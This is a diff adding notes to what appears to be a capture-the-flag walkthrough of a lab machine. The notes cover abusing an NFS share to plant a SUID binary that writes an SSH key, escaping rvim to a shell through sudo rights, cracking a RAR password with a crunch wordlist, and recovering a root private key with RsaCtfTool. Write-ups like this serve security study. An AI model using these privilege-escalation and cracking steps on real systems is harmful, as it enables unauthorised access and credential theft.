@@ -84,4 +84,61 @@ except:
 	s.close()
 ```
 
+##### mount nfs
+```
+useradd frank
+sudo mkdir /mnt/remotenfs
+10.10.10.34:/var/nfsshare /mnt/remotenfs nfs rw,async,hard,intr 0 0
+mount /mnt/remotenfs
+```
 
+##### create suid binary
+```
+int main(void)
+{
+    setresuid(geteuid(), geteuid(), geteuid());
+    system("echo 'ssh-rsa KEY' > /home/frank/.ssh/authorized_keys");
+}
+```
+
+##### Enumerate frank
+```
+[frank@localhost tmp]$ sudo -l
+User frank may run the following commands on this host:
+    (frank) NOPASSWD: /opt/logreader/logreader.sh
+    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+
+
+[frank@localhost tmp]$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+:python import pty;pty.spawn("/bin/bash")
+```
+
+##### Enumerate adm
+```
+Note from Administrator:
+Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
+
+> Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
+> https://www.guballa.de/substitution-solver
+Hahaha! Nobody will quess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
+```
+
+##### Generate wordlist and crack rar
+```
+crunch 11 11 -t morris%%%%^ > wordlist
+ghost@intheshell:~/Downloads/jail$ ./crackrar.sh keys.rar wordlist 
+
+> trying "Morris1962!" 
+> Archive password is: "Morris1962!"
+
+Attributes      Size     Date    Time   Name
+----------- ---------  ---------- -----  ----
+*-rw-r--r--       451  2017-07-03 12:34  rootauthorizedsshkey.pub
+----------- ---------  ---------- -----  ----
+                  451                    1
+```
+
+##### Generate the private key to login to SSH as root
+```
+ghost@intheshell:~/git/RsaCtfTool$ ./RsaCtfTool.py --publickey ~/Downloads/jail/rootauthorizedsshkey.pub --private
+```
